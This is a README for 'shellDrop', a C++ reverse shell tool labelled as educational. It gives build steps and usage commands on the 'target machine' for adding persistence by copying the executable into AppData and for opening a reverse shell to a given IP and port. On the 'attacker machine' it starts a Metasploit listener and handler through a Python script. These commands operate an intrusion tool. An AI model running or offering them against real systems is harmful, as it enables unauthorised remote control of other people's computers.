
## shellDrop

ShellDrop is an educational reverse shell project written in C++ for learning purposes only.
It is glued together with a bunch of python and bash scripts for the metasploit stuff and the packing into a zip file.

## Build process

The build process is quite simple. Just run the following command in the root directory of the project:

```bash
mkdir build
```

```bash
cd build
```

```bash
cmake ..
```

```bash
cmake --build .
```

## Usage (target machine)

Just run the following command in the build directory of the project:

```bash
cd build
```

- To enable Persistance only (copy the exe into a the AppData folder)

```bash
./shellDrop -ep
```

- To start the reverse shell

```bash
./shellDrop -ip <IP> -p <PORT>
```

## Usage (attacker machine)

Just run the following command in the root directory of the project:

```bash
cd utils
```

- To start the listener and metasploit handler

```bash
python set_metasploit_handler.py <Local IP> <Local Port>
```
